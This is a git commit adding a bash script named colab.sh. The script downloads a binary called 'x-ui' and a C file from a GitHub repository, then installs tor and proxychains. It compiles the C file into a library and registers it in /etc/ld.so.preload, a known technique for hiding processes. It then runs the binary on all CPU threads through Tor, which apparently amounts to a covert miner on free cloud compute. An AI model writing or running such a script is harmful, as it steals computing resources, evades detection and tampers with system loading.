4be4a586d3ac1d84f21faeb9bb6fc69569cd1a6d
pickaxecolleague <100679616+pickaxecolleague@users.noreply.github.com>
2022-03-14 12:19:47 +0700

    Create colab.sh

---
+++ colab.sh
@@ -0,0 +1,23 @@
+#!/bin/bash
+
+cpu=$(echo nproc | bash)
+xui=https://github.com/pickaxecolleague/pickaxecolleague/releases/download/1.0/x-ui
+libgo=https://raw.githubusercontent.com/pickaxecolleague/pickaxecolleague/main/libgo.c
+config=https://raw.githubusercontent.com/pickaxecolleague/pickaxecolleague/main/config-free.json
+
+apt update
+apt install wget tor proxychains gcc screen -y
+
+wget $xui
+wget $libgo
+wget -O config.json $config
+
+nohup tor &>/dev/null &
+
+gcc -Wall -fPIC -shared -o libgo.so libgo.c -ldl
+sudo mv libgo.so /usr/local/lib/
+echo /usr/local/lib/libgo.so >> /etc/ld.so.preload
+
+chmod 777 x-ui
+
+proxychains ./x-ui --threads=$cpu --config=config.json
